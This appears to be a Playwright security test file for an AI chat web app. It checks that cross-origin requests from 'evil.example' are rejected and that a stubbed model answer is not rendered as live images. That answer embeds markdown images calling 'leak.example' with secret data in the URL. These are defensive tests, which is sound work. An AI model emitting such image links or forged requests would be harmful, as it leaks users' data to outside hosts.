// SPDX-License-Identifier: Apache-2.0

import { env, expect, test, uiLogin } from "./helpers";

// (f) Web-tier security negatives.
test("cross-origin mutating requests to /api/* are rejected with 403", async ({ request }) => {
  // The origin guard runs before authentication, so a 403 (not 401) proves a
  // foreign page could not make the browser perform these with the user's
  // cookies.
  for (const [method, path] of [
    ["POST", "/api/chat"],
    ["DELETE", "/api/conversations"],
    ["POST", "/api/admin/documents/retry-failed"],
    ["PUT", "/api/admin/branding"],
  ] as const) {
    const res = await request.fetch(`${env.web}${path}`, {
      method,
      headers: { Origin: "https://evil.example", "Content-Type": "application/json" },
      data: "{}",
    });
    expect(res.status(), `${method} ${path}`).toBe(403);
    expect(await res.json()).toEqual({ detail: "Cross-origin request rejected" });
  }

  // No Origin and no Referer on a mutating request is refused as well.
  const bare = await request.fetch(`${env.web}/api/conversations`, { method: "DELETE" });
  expect(bare.status()).toBe(403);
});

test("a markdown image pointing at an external host is never rendered as <img>", async ({ page, stack }) => {
  await uiLogin(page, stack.adminEmail, stack.adminPassword);
  await expect(page).toHaveURL(/\/dashboard/);

  // Stub only the answer stream: the real chat UI renders a model answer that
  // tries to exfiltrate data through image URLs.
  const leaks: string[] = [];
  page.on("request", (r) => {
    if (r.url().includes("leak.example")) leaks.push(r.url());
  });
  await page.route("**/api/chat", (route) =>
    route.fulfill({
      status: 200,
      headers: { "Content-Type": "text/event-stream; charset=utf-8" },
      body: [
        `data: ${JSON.stringify({
          delta:
            "Here you go ![chart](https://leak.example/a.png?d=secret) and ![pixel](//leak.example/b.png?d=secret) done.",
        })}`,
        `event: done\ndata: ${JSON.stringify({ message_id: "m-e2e" })}`,
        "",
      ].join("\n\n"),
    }),
  );

  await page.goto("/chat");
  const composer = page.getByPlaceholder("Ask something…");
  await composer.fill("Show me the chart");
  await page.getByRole("button", { name: "Send" }).click();

  await expect(page.getByText("done.", { exact: false })).toBeVisible();
  await expect(page.locator('img[src*="leak.example"]')).toHaveCount(0);
  // Rendered as plain links the user would have to click deliberately.
  await expect(page.getByRole("link", { name: "chart" })).toHaveAttribute("href", /leak\.example/);
  expect(leaks).toEqual([]);
});
